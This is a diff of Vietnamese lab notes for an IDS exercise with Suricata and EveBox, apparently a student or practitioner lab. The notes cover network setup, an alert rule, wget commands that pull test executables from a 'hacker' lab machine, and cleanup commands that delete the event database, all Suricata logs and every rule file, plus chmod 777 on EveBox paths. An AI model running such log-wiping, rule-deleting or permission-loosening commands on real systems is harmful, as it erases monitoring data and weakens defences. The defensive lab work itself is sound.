@@ -30,7 +30,7 @@ Mở DB Browser for SQLite với Quyền root sau đơ mở file events.sqlite:
  Kiểm tra trạng thái: sudo systemctl status evebox
  xóa : sudo rm /var/lib/evebox/events.sqlite
  Khởi động lại dịch vụ EveBox: sudo systemctl start evebox
-
++ Dùng 1 lệnh chung: sudo systemctl stop evebox && sudo rm /var/lib/evebox/events.sqlite && sudo systemctl start evebox
 - để gửi log từ evebox lên mongodb
 + truy cập thư mục ~/Documents/sendlog_to_mongodb
 + câp quyền cho evebox:   sudo chmod 777 /var/lib/evebox  và    sudo chmod 777 /var/lib/evebox/events.sqlite  
@@ -96,6 +96,8 @@ alert http any any -> any any (msg:"dang tai file"; sid:10000001;)              
             + máy client truy cập vào terminal (vì vào chrome thì trình duyệt nó bảo vệ file nên ko thể tải file mã độc về được), ở đây ta tải về đâu thì ta Mở
             terminal ở thư mục đó : 
             wget http://192.168.10.5/downloads/demo.exe     wget http://192.168.10.5/downloads/yourfile.txt  
+
++ Lệnh tải 13 file cùng lúc: tạo 1 file danhsach.txt gồm 13 file cần tải xuống, sau đó chạy lệnh : wget -i danhsach.txt (đường dẫn tuyệt đối đến file txt)
 *** Thông tin hash 2 file demo.exe và yourfile.txt đúng
  - yourfile.txt:
       + MD5: 0faeda9053e7c336690e0e8e20e304d0 
@@ -121,7 +123,29 @@ chú ý 2 sự kiện là "fileinfo" và "http". còn để phát hiện các cu
             + eth2: 192.168.10.5
 - các địa chỉ ip :
 +  192.168.10.3 , 192.168.10.5, 192.168.10.10 : chỉ cần cấu hình ip tĩnh 
-+ 192.168.189.128  , 192.168.189.133: cấu hình ip tĩnh, gateway: 92.168.189.2, dns : 92.168.189.2 (tắt dns auto đi), router để auto
-+ riêng ở máy hacker ip  192.168.189.135 , ta để nó tự động nhận vì ip này để kết nối internet chứ ko phải ip để tấn công client
++ 192.168.189.128  , 192.168.189.133,192.168.189.135: cấu hình ip tĩnh, gateway: 192.168.189.2, dns : 192.168.189.2 (tắt dns auto đi), router để auto
+
+===================== Tổng hợp lệnh hay dùng
+1. Server :
+- xóa dữ liệu trong db events.sqlite: sudo systemctl stop evebox && sudo rm /var/lib/evebox/events.sqlite && sudo systemctl start evebox
+2. máy client:
+- xóa tất cả log suricata: 
++ cd /var/log/suricata && sudo truncate -s 0 fast.log eve.json stats.log suricata.log suricata-start.log
++ cd /var/log/suricata && sudo rm fast.log eve.json stats.log suricata.log suricata-start.log
+- xóa tất cả file rule: sudo rm /var/lib/suricata/rules/*.rules
+- chạy bwapp: docker start 20542484b569
+- tải 13 file (làm cách này không đồng bộ được dữ liệu giữa sqlite và mongodb
+): wget -i danhsach.txt(danh sách 13 file) |  wget -i /home/william/Documents/Monitor_log/danhsach.txt
+- tải từng file : 
+                    + wget http://192.168.189.135/downloads/demo.exe
+                    + wget http://192.168.189.135/downloads/yourfile.txt
+                    + wget http://192.168.189.135/downloads/install.exe
+                    + wget http://192.168.189.135/downloads/network.dll
+                    + wget http://192.168.189.135/downloads/notepad.exe
+                    + wget http://192.168.189.135/downloads/project.exe
+                    + wget http://192.168.189.135/downloads/simulator.exe
+                    + wget http://192.168.189.135/downloads/tool.exe
+                    + wget http://192.168.189.135/downloads/toolkit.exe
+- chạy 2 file thực thi đẻ thu thập log đồng thời trên cả 2 công cụ
 
 
